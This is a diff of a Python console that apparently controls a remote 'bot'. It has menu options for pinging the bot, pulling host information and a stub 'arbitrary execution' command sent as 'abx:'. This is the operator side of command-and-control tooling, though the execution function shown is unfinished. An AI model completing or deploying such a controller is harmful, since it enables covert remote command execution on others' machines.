@@ -3,6 +3,7 @@ import shutil
 import threading
 import channel
 import time
+# TODO: add targeted messages
 
 print("initializing communications...")
 rx = channel.Receiver()
@@ -17,6 +18,12 @@ def show_header():
 
 def main_menu():
     show_header()
+    for i in rx.messages:
+        if i.finalized and i.payload == "rtm":
+            print("\nWarning! your last command failed to transmit! Please try again.")
+            rx.tlock.acquire()
+            rx.messages.remove(i)
+            rx.tlock.release()
     print("\nMain Menu:\n")
     print("1) Test Connection to Bot")
     print("2) Show Host Information")
@@ -41,6 +48,8 @@ def main_menu():
 
 
 def test_conn():
+    # TODO: add parsing for ID in test communications
+    # Command: send back ok response
     send("ping")
     print("Waiting for response...")
     start = time.time()
@@ -62,6 +71,7 @@ def test_conn():
 
 
 def show_info():
+    # Command: respond with sys info (space separated)
     send("info")
     print("Waiting 1 minute for response...")
     start = time.time()
@@ -87,6 +97,10 @@ def show_info():
 
 
 def arbitrary_exec():
+    print("I hope you know what you're doing!")
+    tmp = input()
+    # Command: ArBitrary eXecution
+    send("abx:")
     pass
 
 
